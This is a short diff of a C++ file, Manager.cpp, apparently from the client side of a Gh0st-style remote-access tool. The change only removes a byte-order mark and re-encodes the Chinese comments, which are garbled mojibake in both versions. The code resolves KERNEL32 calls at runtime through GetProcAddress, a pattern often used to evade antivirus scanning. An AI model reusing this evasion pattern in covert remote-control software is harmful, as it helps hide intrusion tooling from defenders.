@@ -1,8 +1,8 @@
-ï»¿// Manager.cpp: implementation of the CManager class.
+// Manager.cpp: implementation of the CManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
-#include "../Declare.h"   //åŠ¨æ€è°ƒç”¨åº“å‡½æ•°
+#include "../Declare.h"   //¶¯Ì¬µ÷ÓÃ¿âº¯Êı
 #include "Manager.h"
 #include "until.h"
 
@@ -15,7 +15,7 @@ CManager::CManager(CClientSocket *pClient)
 	m_pClient = pClient;
 	m_pClient->SetManagerCallBack(this);
 	
-	// ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrue,ç¦æ­¢ç³»ç»Ÿè‡ªåŠ¨é‡ç½®äº‹ä»¶
+	// µÚ¶ş¸ö²ÎÊıÎªtrue,½ûÖ¹ÏµÍ³×Ô¶¯ÖØÖÃÊÂ¼ş
 	CreateEventAT pCreateEventA=(CreateEventAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateEventA");
 	m_hEventDlgOpen = pCreateEventA(NULL, true, false, NULL);
 }
@@ -67,7 +67,7 @@ void CManager::WaitForDialogOpen()
 {
 	WaitForSingleObjectT pWaitForSingleObject=(WaitForSingleObjectT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"WaitForSingleObject");
 	pWaitForSingleObject(m_hEventDlgOpen, INFINITE);
-	// å¿…é¡»çš„Sleep,å› ä¸ºè¿œç¨‹çª—å£ä»InitDialogä¸­å‘é€COMMAND_NEXTåˆ°æ˜¾ç¤ºè¿˜è¦ä¸€æ®µæ—¶é—´
+	// ±ØĞëµÄSleep,ÒòÎªÔ¶³Ì´°¿Ú´ÓInitDialogÖĞ·¢ËÍCOMMAND_NEXTµ½ÏÔÊ¾»¹ÒªÒ»¶ÎÊ±¼ä
 	Sleep(150);
 }
 
